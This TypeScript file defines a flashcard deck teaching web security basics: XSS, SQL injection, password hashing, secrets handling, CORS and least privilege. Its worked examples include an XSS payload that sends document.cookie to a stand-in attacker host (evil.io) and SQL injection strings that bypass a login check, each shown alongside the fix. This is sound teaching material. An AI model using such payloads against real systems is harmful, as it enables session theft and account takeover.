import type { Card } from '../types';

const T = 1751328000000;
const D = 'security-basics';

export const securityCards: Card[] = [
  // ---- Q&A ----
  {
    id: 'sec-xss-001',
    deckId: D,
    type: 'qa',
    tags: ['xss', 'web-security'],
    createdAt: T,
    question: 'What is XSS (cross-site scripting), and what is the core defense?',
    answer:
      'An attacker gets THEIR JavaScript to run in YOUR users\' browsers — classically by submitting `<script>` in a comment that your site renders unescaped. Defense: never inject raw user input into HTML; escape/encode it (frameworks like React do this by default — which is why `dangerouslySetInnerHTML` is named that).',
  },
  {
    id: 'sec-sqli-002',
    deckId: D,
    type: 'qa',
    tags: ['sql-injection'],
    createdAt: T,
    question: 'How does SQL injection work, and what prevents it?',
    answer:
      'If you build queries by string-gluing user input, input like `\' OR 1=1 --` becomes part of the SQL itself and rewrites your query. Prevention: PARAMETERIZED queries — placeholders (`WHERE id = ?`) keep data strictly separated from the SQL, so input can never become code.',
  },
  {
    id: 'sec-passwords-003',
    deckId: D,
    type: 'qa',
    tags: ['passwords', 'hashing'],
    createdAt: T,
    question: 'How should passwords be stored?',
    answer:
      'Never plaintext, never encrypted (encryption is reversible), never fast-hashed (MD5/SHA-256 can be brute-forced by the billions per second). Use a slow, salted password hash — bcrypt, scrypt, or argon2. Salting means identical passwords produce different hashes, killing precomputed lookup tables.',
  },
  {
    id: 'sec-secrets-004',
    deckId: D,
    type: 'qa',
    tags: ['secrets'],
    createdAt: T,
    question: 'Where do API keys and secrets belong — and where must they never go?',
    answer:
      'In environment variables or a secrets manager, loaded at runtime; locally in a `.env` file that is in `.gitignore`. Never in source code — git history is forever, and scrapers find leaked keys on GitHub within minutes. Also never in FRONTEND code: anything shipped to the browser is public.',
  },
  {
    id: 'sec-cors-005',
    deckId: D,
    type: 'qa',
    tags: ['cors', 'web-security'],
    createdAt: T,
    question: 'What is CORS actually doing?',
    answer:
      'Browsers block JavaScript on site A from reading responses from site B (the same-origin policy). CORS is the server-side opt-out: B sends `Access-Control-Allow-Origin` headers saying which origins may read its responses. Key insight: it protects USERS from malicious sites, and it is enforced by the browser — curl and servers ignore it.',
  },
  {
    id: 'sec-validate-server-006',
    deckId: D,
    type: 'qa',
    tags: ['validation'],
    createdAt: T,
    question: 'Client-side validation feels sufficient. Why must the server validate everything again?',
    answer:
      'Because attackers do not use your UI — they send requests directly with curl or scripts, skipping every check your JavaScript makes. Client validation is UX (instant feedback); server validation is SECURITY. Assume every incoming request is hand-crafted by someone hostile.',
  },
  {
    id: 'sec-least-priv-007',
    deckId: D,
    type: 'qa',
    tags: ['principles'],
    createdAt: T,
    question: 'What is the principle of least privilege?',
    answer:
      'Every user, service, and API key gets the MINIMUM access needed for its job — read-only if it only reads, one database not all of them, expiring tokens over eternal ones. Then a leaked key or compromised service limits the blast radius instead of handing over everything.',
  },

  // ---- Multiple choice ----
  {
    id: 'sec-param-mcq-008',
    deckId: D,
    type: 'mcq',
    tags: ['sql-injection'],
    createdAt: T,
    question: 'Which query is safe from SQL injection?',
    code: "// A\ndb.query(`SELECT * FROM users WHERE name = '` + name + `'`);\n// B\ndb.query('SELECT * FROM users WHERE name = ?', [name]);",
    language: 'js',
    choices: [
      'A — template strings are safe',
      'B — the placeholder keeps input as pure data',
      'Both, if you trim the input',
      'Neither',
    ],
    correctIndex: 1,
    explanation:
      'Only parameterization separates code from data. String concatenation (A) is injectable no matter how you sanitize — blocklists always miss something.',
  },
  {
    id: 'sec-hash-mcq-009',
    deckId: D,
    type: 'mcq',
    tags: ['passwords', 'hashing'],
    createdAt: T,
    question: 'Right tool for storing user passwords?',
    choices: ['SHA-256', 'AES encryption', 'bcrypt/argon2', 'Base64'],
    correctIndex: 2,
    explanation:
      'bcrypt/argon2 are deliberately SLOW and salted — built for passwords. SHA-256 is too fast (brute-forceable), AES is reversible (the key becomes the prize), Base64 is just encoding, not protection at all.',
  },
  {
    id: 'sec-leaked-mcq-010',
    deckId: D,
    type: 'mcq',
    tags: ['secrets'],
    createdAt: T,
    question: 'You accidentally committed an API key to a public repo. First action?',
    choices: [
      'Delete the file and force-push',
      'Rotate (revoke + reissue) the key immediately',
      'Make the repo private',
      'Add it to .gitignore now',
    ],
    correctIndex: 1,
    explanation:
      'Treat it as compromised the moment it was pushed — bots scan public commits in real time. Deleting or hiding it does not un-leak it (history, forks, caches). Kill the key first, clean up second.',
  },
  {
    id: 'sec-https-mcq-011',
    deckId: D,
    type: 'mcq',
    tags: ['https'],
    createdAt: T,
    question: 'What does HTTPS protect against?',
    choices: [
      'Bugs in your server code',
      'Eavesdropping and tampering between browser and server',
      'SQL injection',
      'Weak passwords',
    ],
    correctIndex: 1,
    explanation:
      'TLS encrypts the connection (nobody on the network can read it) and authenticates the server (you are talking to the real site, not an imposter). Everything INSIDE your app is still your job.',
  },

  // ---- Fill in the blank ----
  {
    id: 'sec-param-cloze-012',
    deckId: D,
    type: 'cloze',
    tags: ['sql-injection'],
    createdAt: T,
    language: 'js',
    code: "// Data stays data — never part of the SQL string:\ndb.query('SELECT * FROM orders WHERE user_id = {{c1::?}}', [userId]);",
    explanation:
      'The driver sends the query template and values separately; the database treats the value as pure data. Injection becomes structurally impossible.',
  },
  {
    id: 'sec-env-cloze-013',
    deckId: D,
    type: 'cloze',
    tags: ['secrets'],
    createdAt: T,
    language: 'bash',
    code: '# .env holds secrets, so .gitignore must contain:\n{{c1::.env}}\n\n# code reads them at runtime:\n# const key = process.env.STRIPE_KEY;',
    explanation:
      'The .env file exists only on each machine/deployment, never in git. Commit a `.env.example` with dummy values so teammates know which variables to set.',
  },

  // ---- Worked examples ----
  {
    id: 'sec-we-xss-014',
    deckId: D,
    type: 'worked-example',
    tags: ['xss', 'web-security'],
    createdAt: T,
    language: 'js',
    title: 'Anatomy of an XSS attack',
    prompt: 'A comment box renders comments with innerHTML. Walk through how it gets exploited and fixed.',
    steps: [
      {
        code: "list.innerHTML += `<p>${comment.text}</p>`;",
        text: 'The vulnerable line: user text is pasted straight into HTML. For normal comments it works fine — which is why this bug survives review.',
      },
      {
        code: '// attacker submits as their "comment":\n<img src=x onerror="fetch(\'https://evil.io/steal?c=\' + document.cookie)">',
        text: 'The attacker\'s comment IS markup. The broken image fires `onerror`, running their JS in every visitor\'s browser with your site\'s cookies and permissions.',
      },
      {
        code: "const p = document.createElement('p');\np.textContent = comment.text;\nlist.append(p);",
        text: '`textContent` treats input as TEXT, never markup — the attack renders as harmless gibberish. React/Vue do this escaping by default; the classic ways to reintroduce the hole are innerHTML and dangerouslySetInnerHTML.',
      },
    ],
  },
  {
    id: 'sec-we-sqli-015',
    deckId: D,
    type: 'worked-example',
    tags: ['sql-injection'],
    createdAt: T,
    language: 'sql',
    title: 'Watch a login form get injected',
    prompt: "The login query is built by string concatenation. Predict what the attacker's input does.",
    steps: [
      {
        code: "-- code builds:\nSELECT * FROM users\nWHERE name = '<input>' AND pass = '<input>';",
        text: 'Intended shape: both inputs are compared as strings. The developer assumes input stays inside the quotes.',
      },
      {
        code: "-- attacker types username:  admin' --\nSELECT * FROM users\nWHERE name = 'admin' --' AND pass = '';",
        text: "The `'` closes the string early and `--` comments out the REST OF THE QUERY — including the password check. The query now reads \"find user admin\", and the attacker is logged in as admin with no password.",
      },
      {
        code: "db.query(\n  'SELECT * FROM users WHERE name = ? AND pass = ?',\n  [name, hash]\n);",
        text: "Parameterized, the same input is searched for literally — a user named `admin' --` does not exist, login fails. No escaping cleverness required: data and code never mix.",
      },
    ],
  },
];
